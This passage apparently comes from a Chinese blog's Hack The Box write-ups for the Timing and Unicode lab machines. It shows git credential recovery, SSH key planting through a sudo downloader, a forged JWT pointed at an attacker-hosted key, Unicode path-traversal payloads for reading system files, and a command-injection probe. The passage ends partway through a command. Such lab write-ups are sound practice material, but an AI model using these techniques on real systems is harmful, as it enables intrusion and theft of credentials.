22:34 avatar_uploader.php drwxr-xr-x 2 root root 4096 7月 20 22:34 css -rw-r--r-- 1 root root 92 7月 20 22:34 db_conn.php -rw-r--r-- 1 root root 3937 7月 20 22:34 footer.php drwxr-xr-x 8 root root 4096 7月 20 22:35 .git -rw-r--r-- 1 root root 1498 7月 20 22:34 header.php -rw-r--r-- 1 root root 507 7月 20 22:34 image.php drwxr-xr-x 3 root root 4096 7月 20 22:34 images -rw-r--r-- 1 root root 188 7月 20 22:34 index.php drwxr-xr-x 2 root root 4096 7月 20 22:34 js -rw-r--r-- 1 root root 2074 7月 20 22:34 login.php -rw-r--r-- 1 root root 113 7月 20 22:34 logout.php -rw-r--r-- 1 root root 3041 7月 20 22:34 profile.php -rw-r--r-- 1 root root 1740 7月 20 22:34 profile_update.php -rw-r--r-- 1 root root 984 7月 20 22:34 upload.php 解压后可以得到.git文件，请求git文件看看能得到什么 ┌──(root💀root)-[~/Desktop/backup] └─# ~/Desktop/GitTools/Extractor/extractor.sh . source ########### # Extractor is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### [*] Destination folder does not exist [*] Creating... [+] Found commit: e4e214696159a25c69812571c8214d2bf8736a3f [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/admin_auth_check.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/auth_check.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/avatar_uploader.php [+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/bootstrap.min.css [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/login.css [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/footer.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/header.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/image.php [+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/background.jpg [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/user-icon.png [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/index.php [+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/avatar_uploader.js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/bootstrap.min.js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/jquery.min.js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/profile.js [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/login.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/logout.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile_update.php [+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/upload.php [+] Found commit: 16de2698b5b122c93461298eab730d00273bd83e [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/admin_auth_check.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/auth_check.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/avatar_uploader.php [+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/bootstrap.min.css [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/login.css [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/footer.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/header.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/image.php [+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/background.jpg [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/user-icon.png [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/index.php [+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/avatar_uploader.js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/bootstrap.min.js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/jquery.min.js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/profile.js [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/login.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/logout.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile_update.php [+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/upload.php 然后多了一个source目录 ┌──(root💀root)-[~/Desktop/backup] └─# ls -la 总用量 80 drwxr-xr-x 7 root root 4096 12月 31 17:42 . drwxr-xr-x 13 root root 4096 12月 31 17:38 .. -rw-r--r-- 1 root root 200 7月 20 22:34 admin_auth_check.php -rw-r--r-- 1 root root 373 7月 20 22:34 auth_check.php -rw-r--r-- 1 root root 1268 7月 20 22:34 avatar_uploader.php drwxr-xr-x 2 root root 4096 7月 20 22:34 css -rw-r--r-- 1 root root 92 7月 20 22:34 db_conn.php -rw-r--r-- 1 root root 3937 7月 20 22:34 footer.php drwxr-xr-x 8 root root 4096 7月 20 22:35 .git -rw-r--r-- 1 root root 1498 7月 20 22:34 header.php -rw-r--r-- 1 root root 507 7月 20 22:34 image.php drwxr-xr-x 3 root root 4096 7月 20 22:34 images -rw-r--r-- 1 root root 188 7月 20 22:34 index.php drwxr-xr-x 2 root root 4096 7月 20 22:34 js -rw-r--r-- 1 root root 2074 7月 20 22:34 login.php -rw-r--r-- 1 root root 113 7月 20 22:34 logout.php -rw-r--r-- 1 root root 3041 7月 20 22:34 profile.php -rw-r--r-- 1 root root 1740 7月 20 22:34 profile_update.php drwxr-xr-x 4 root root 4096 12月 31 17:42 source -rw-r--r-- 1 root root 984 7月 20 22:34 upload.php ┌──(root💀root)-[~/Desktop/backup] └─# cd source ┌──(root💀root)-[~/Desktop/backup/source] └─# ls -la 总用量 16 drwxr-xr-x 4 root root 4096 12月 31 17:42 . drwxr-xr-x 7 root root 4096 12月 31 17:42 .. drwxr-xr-x 5 root root 4096 12月 31 17:42 0-e4e214696159a25c69812571c8214d2bf8736a3f drwxr-xr-x 5 root root 4096 12月 31 17:42 1-16de2698b5b122c93461298eab730d00273bd83e 然后多了两个文件夹 ┌──(root💀root)-[~/Desktop/backup/source] └─# diff 0-e4e214696159a25c69812571c8214d2bf8736a3f/ 1-16de2698b5b122c93461298eab730d00273bd83e/ 1 ⨯ diff &#39;--color=auto&#39; 0-e4e214696159a25c69812571c8214d2bf8736a3f/commit-meta.txt 1-16de2698b5b122c93461298eab730d00273bd83e/commit-meta.txt 1,3c1,4 &lt; tree fd7fb62599f9702baeb0abdc42a8a4b68e49ec23 &lt; author grumpy &lt;grumpy@localhost.com&gt; 1626820434 +0000 &lt; committer grumpy &lt;grumpy@localhost.com&gt; 1626820434 +0000 --- &gt; tree dcbc181650833009145874df7da85b4c6d84b2ca &gt; parent e4e214696159a25c69812571c8214d2bf8736a3f &gt; author grumpy &lt;grumpy@localhost.com&gt; 1626820453 +0000 &gt; committer grumpy &lt;grumpy@localhost.com&gt; 1626820453 +0000 5c6 &lt; init --- &gt; db_conn updated 0-e4e214696159a25c69812571c8214d2bf8736a3f/css 和 1-16de2698b5b122c93461298eab730d00273bd83e/css 有共同的子目录 diff &#39;--color=auto&#39; 0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php 1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php 2c2 &lt; $pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;S3cr3t_unGu3ss4bl3_p422w0Rd&#39;); --- &gt; $pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;4_V3Ry_l0000n9_p422w0rd&#39;); 0-e4e214696159a25c69812571c8214d2bf8736a3f/images 和 1-16de2698b5b122c93461298eab730d00273bd83e/images 有共同的子目录 0-e4e214696159a25c69812571c8214d2bf8736a3f/js 和 1-16de2698b5b122c93461298eab730d00273bd83e/js 有共同的子目录 数据库凭证已被修改为S3cr3t_unGu3ss4bl3_p422w0Rd，现在我们使用ssh进行登录 ┌──(root💀root)-[~/Desktop] └─# ssh aaron@10.10.11.135 aaron@10.10.11.135&#39;s password: Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri Dec 31 17:46:35 UTC 2021 System load: 0.0 Processes: 180 Usage of /: 51.5% of 4.85GB Users logged in: 1 Memory usage: 18% IP address for eth0: 10.10.11.135 Swap usage: 0% 8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Fri Dec 31 17:46:08 2021 from 10.10.14.52 aaron@timing:~$ whoami&amp;&amp;id aaron uid=1000(aaron) gid=1000(aaron) groups=1000(aaron) 成功登录aaron用户 aaron@timing:~$ cat user.txt a3376cc0a8af0e0aa3f66bec0adec1d5 成功拿到user权限的flag文件 权限提升aaron@timing:~$ sudo -l Matching Defaults entries for aaron on timing: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User aaron may run the following commands on timing: (ALL) NOPASSWD: /usr/bin/netutils 首先查看一下sudo权限 可以以root权限执行&#x2F;usr&#x2F;bin&#x2F;netutils这个二进制文件，研究研究 aaron@timing:~$ cat /usr/bin/netutils #! /bin/bash java -jar /root/netutils.jar aaron@timing:~$ file /usr/bin/netutils /usr/bin/netutils: Bourne-Again shell script, ASCII text executable 首先查看一下文件类型 这是一个bash脚本，功能是从根目录下载运行一个java文件，执行一下试试 aaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; 执行后给了我们两个选项，FTP还是HTTP，设置一个HTTP然后下载测试文件看看把 ┌──(root💀root)-[~/Desktop] └─# python3 -m http.server 80 2 ⨯ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... aaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; 1 Enter Url: 10.10.14.52/test.txt Initializing download: http://10.10.14.52/test.txt File size: 14 bytes Opening output file test.txt Server unsupported, starting from scratch with one connection. Starting download Downloaded 14 byte in 0 seconds. (0.02 KB/s) netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; 2 aaron@timing:~$ ls -la test.txt -rw-r--r-- 1 root root 14 Dec 31 17:58 test.txt 成功从我们本地下载了这个文件，并且是root权限的，那就好办了 接着对root账户下的.ssh文件创建一个链接 aaron@timing:~$ ln -s /root/.ssh/authorized_keys keys ln: failed to access &#39;keys&#39;: Permission denied aaron@timing:~$ ls -la total 52 drwxr-x--x 5 aaron aaron 4096 Dec 31 18:06 . drwxr-xr-x 3 root root 4096 Dec 2 09:55 .. lrwxrwxrwx 1 root root 9 Oct 5 15:33 .bash_history -&gt; /dev/null -rw-r--r-- 1 aaron aaron 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 aaron aaron 3771 Apr 4 2018 .bashrc drwx------ 2 aaron aaron 4096 Nov 29 01:34 .cache drwx------ 3 aaron aaron 4096 Nov 29 01:34 .gnupg lrwxrwxrwx 1 aaron aaron 26 Dec 31 18:06 keys -&gt; /root/.ssh/authorized_keys drwxrwxr-x 3 aaron aaron 4096 Nov 29 01:34 .local lrwxrwxrwx 1 aaron aaron 11 Dec 31 17:54 passwd -&gt; /etc/passwd lrwxrwxrwx 1 aaron aaron 11 Dec 31 18:02 passwd.0 -&gt; /etc/passwd -rw-r--r-- 1 root root 1735 Dec 31 17:57 passwd.1 lrwxrwxrwx 1 aaron aaron 11 Dec 31 17:57 passwd.2 -&gt; /etc/passwd -rw-r--r-- 1 root root 1735 Dec 31 17:57 passwd.3 -rw-r--r-- 1 root root 1735 Dec 31 18:03 passwd.4 -rw-r--r-- 1 aaron aaron 807 Apr 4 2018 .profile -rw-r--r-- 1 root root 14 Dec 31 17:58 test.txt -rw-r----- 1 root aaron 33 Dec 31 17:51 user.txt lrwxrwxrwx 1 root root 9 Oct 5 15:33 .viminfo -&gt; /dev/null 接着在本地创建一个ssh的密钥，然后复制到桌面，改名为keys ┌──(root💀root)-[~/Desktop] └─# ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa Your public key has been saved in /root/.ssh/id_rsa.pub The key fingerprint is: SHA256:M12TnW2ZwayF1exH6fYv+fqbplhkdyxg/9oFI+yu7os root@root The key&#39;s randomart image is: +---[RSA 3072]----+ | =+o| | + BB| | * *=o| | . + = =o| | S . oo*.=| | o .o..=o| | .. .+| | . .o o++| | Eo=+..=B=| +----[SHA256]-----+ ┌──(root💀root)-[~/Desktop] └─# ls -la /root/.ssh 总用量 20 drwx------ 2 root root 4096 1月 1 12:56 . drwx------ 28 root root 4096 1月 1 12:56 .. -rw------- 1 root root 2590 1月 1 12:56 id_rsa -rw-r--r-- 1 root root 563 1月 1 12:56 id_rsa.pub -rw-r--r-- 1 root root 3772 12月 31 17:45 known_hosts ┌──(root💀root)-[~/Desktop] └─# cp /root/.ssh/id_rsa.pub keys ┌──(root💀root)-[~/Desktop] └─# ls keys ┌──(root💀root)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 接着使用python3开启一个http服务 aaron@timing:~$ sudo /usr/bin/netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; 1 Enter Url: http://10.10.14.52/keys Initializing download: http://10.10.14.52/keys File size: 563 bytes Opening output file keys Server unsupported, starting from scratch with one connection. Starting download Downloaded 563 byte in 0 seconds. (0.91 KB/s) netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input &gt;&gt; 2 接着使用&#x2F;usr&#x2F;bin&#x2F;netutils来下载keys 然后使用ssh -i进行连接登录 ┌──(root💀root)-[~/.ssh] └─# ssh -i id_rsa root@10.10.11.135 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat Jan 1 13:29:39 UTC 2022 System load: 0.0 Processes: 202 Usage of /: 48.7% of 4.85GB Users logged in: 1 Memory usage: 10% IP address for eth0: 10.10.11.135 Swap usage: 0% 8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Dec 7 12:08:29 2021 root@timing:~# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功拿到root权限 root@timing:~# ls axel netutils.jar root.txt root@timing:~# cat root.txt c9e18f123e0e2012bbf16a0f64bc3715 成功拿到root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Unicode - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Unicode","date":"2021-12-16T11:38:36.000Z","updated":"2023-06-13T03:54:24.000Z","comments":true,"path":"2021/12/16/Hackthebox/Medium/Hackthebox-Unicode/","link":"","permalink":"http://www.lucifiel.com/2021/12/16/Hackthebox/Medium/Hackthebox-Unicode/","excerpt":"","text":"Hackthebox - Unicode靶场信息 靶场类型 信息搜集首先使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.126 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 01:22 EST Nmap scan report for 10.10.11.126 Host is up (0.22s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA) | 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA) |_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-generator: Hugo 0.83.1 |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Hackmedia No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=12/4%OT=22%CT=1%CU=41014%PV=Y%DS=2%DC=T%G=Y%TM=61AB094 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=C)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 217.74 ms 10.10.14.1 2 217.99 ms 10.10.11.126 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.13 seconds 这里只扫描到22和80端口，去80端口看一下http服务内容 这好像是一个威胁情报公司的官网，老规矩，一边扫描目录，一边看网站 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.11.126/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 9294 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.126/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 9294 ________________________________________________ . [Status: 200, Size: 2078, Words: 363, Lines: 69] :: Progress: [43003/43003] :: Job [1/1] :: 155 req/sec :: Duration: [0:04:48] :: Errors: 0 :: 加了过滤后没扫出来东西，只能去一个个功能检查了 随便注册一个账号去试试能不能登录 登录后的页面，到处看看有没有什么可以利用的点吧 看到这里有一个上传点，上传试试吧 传是可以传的，但是感觉无法执行和不知道上传后的地址，放弃，看看其他思路 查看了一下cookie，莫名觉得眼熟，这不是JWT吗 复制到JWT.IO去看看 https://jwt.io/ 获得了一个新的URL http://hackmedia.htb/static/jwks.json 我们把这个页面添加到hosts里 echo 10.10.11.126 hackmedia.htb &gt;&gt; /etc/hosts 然后再去访问这个URL 将获取到的json保存到本地 curl http://hackmedia.htb/static/jwks.json &gt; jwks.json https://hackernoon.com/json-web-tokens-jwt-demystified-f7e202249640 https://openid.net/specs/draft-jones-json-web-key-03.html#Acknowledgements 找到两篇jwt相关的文章，大家有兴趣的自己看一下吧，我就不详细讲解了 https://mkjwk.org/ 使用在线工具生成一个jwt的key 然后使用我们生成出来的json里的n值，替换掉我们保存的json里的n值 漏洞利用使用python3开启一个http服务 ┌──(root💀kali)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 用admin替换掉我们的用户名，然后将新生成的key填入后生成新的JWT令牌 { &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;jku&quot;: &quot;http://hackmedia.htb/static/../redirect?url=10.10.14.14/jwks.json&quot; } eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMTQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.BKe3g8gh_oyrQIjTOgSh4AqIKTHI79jQQhSG1t-jVxx0pvXL0yCAJi0gXvKpNSbKG_cVpzXlVT4e_mNmfF1-IqoneHTmkhEAMFR0ZT4AeVykvDFTlqaKJj2mgjTcXZ_S8odcWAQNRuzondUaOjRT9wr-_CrPm5xkbUwX_mu3p2jM1AWFISba8XM6bcnIBalRb398-7KJIveBaOhqmjEVdV4voFaBBMU7vS8yS4hhhzgE6NdvxiHPIeSFUYGpD9HcZXPmIgNAY1UmJjwMrF0n1N_MFGB_7oCK5KlTq4IIx4qRGQ8_JhAw8haQbC1jwC6A3zlHzqMVSfoafd6BdtYZ4A http://hackmedia.htb/login/ 得到了我们的新的令牌，然后去替换掉令牌 替换掉以后刷新页面 成功进入后台 点击这俩随便一个，会跳转到对应的pdf文件，这里经过各种测试，然后与朋友沟通后，发现可能是由于浏览器机制的原因，导致使用Firefox会有点问题，所以这里我换成了Chrome来执行 看着这个结构，我感觉有本地文件读取的漏洞，测一下 这里404了，但是却提示了我们有过滤，并且说我们永远也过不去这个过滤？ 这我就不服了，不就unicode吗，绕他丫的 https://lazarv.com/posts/unicode-normalization-vulnerabilities/ 看样子过滤是绕过去了，但是没访问到文件，那就层数不够嘛，再多加几层就好了 http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd 这不就读取到了吗 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false code:x:1000:1000:,,,:/home/code:/bin/bash 这里看到有一个mysql的权限组，去读取mysql的密码，但不知道mysql路径在哪 我们知道nginx在这台靶机上运行着呢，试着去读取一下nginx的配置文件 http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml 我们在nginx的配置文件里得到了一个路径 得到了code的用户密码，然后在passwd里我似乎看到code用户有ssh权限，去尝试一下 username = code password = B3stC0d3r2021@@! code@code:~$ whoami&amp;&amp;id code uid=1000(code) gid=1000(code) groups=1000(code) OK，拿到user权限的shell了 code@code:~$ ls coder user.txt code@code:~$ cat user.txt 280ae5b99ba2b4de934bbd3b7f0fb0fd 拿到user权限的flag文件 权限提升code@code:~$ sudo -l Matching Defaults entries for code on code: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User code may run the following commands on code: (root) NOPASSWD: /usr/bin/treport sudo -l看到有一个可以免密码root权限执行的二进制文件，执行一下看看什么效果 code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice: 好像是个威胁报告生成的？ 先正常使用一下功能看看 code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:1 Enter the filename:lucifiel Enter the report:lucifiel Enter your choice:2 ALL THE THREAT REPORTS: lucifiel Enter the filename:3 SOMETHING IS WRONG Enter your choice:3 Enter the IP/file_name:lucifiel % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0curl: (6) Could not resolve host: lucifiel Enter your choice:lucifiel||whoami Wrong Input code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:4 code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:^CTraceback (most recent call last): File &quot;treport.py&quot;, line 79, in &lt;module&gt; File &quot;treport.py&quot;, line 43, in download KeyboardInterrupt [1431] Failed to execute script &#39;treport&#39; due to unhandled exception! 随便使用了了一下功能，发现下载功能似乎是使用了curl进行读取，并且调用了python文件，这里使用工具给提取出python脚本看一下 https://github.com/LucifielHack/pyinstxtractor 首先使用scp将二进制文件下载下来 ┌──(root💀kali)-[~/Desktop/pyinstxtractor] └─# scp code@10.10.11.126:/usr/bin/treport ./ code@10.10.11.126&#39;s password: treport ┌──(root💀kali)-[~/Desktop/pyinstxtractor] └─# python3 